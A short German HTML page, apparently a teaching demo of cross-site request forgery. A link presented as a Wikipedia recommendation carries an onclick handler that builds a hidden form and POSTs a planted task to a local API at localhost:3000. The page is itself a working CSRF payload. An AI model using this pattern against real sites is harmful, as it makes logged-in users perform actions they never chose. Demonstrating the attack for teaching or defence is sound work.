<!DOCTYPE html>
<html lang="de">
  <head>
    <meta charset="UTF-8" />
    <title>CSRF</title>
  </head>
  <body>
    Interessanter Beitrag auf
    <a
      href="http://www.wikipedia.de"
      onclick="
  let f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  let m = document.createElement('input');
  m.setAttribute('type', 'text');
  m.setAttribute('name', 'title');
  m.setAttribute('value', 'Untergeschobene Aufgabe');
  f.appendChild(m);
  f.method = 'POST';
  f.action = 'http://localhost:3000/api/tasks';
  f.submit();
  return false;"
      >Wikipedia!</a
    >
  </body>
</html>
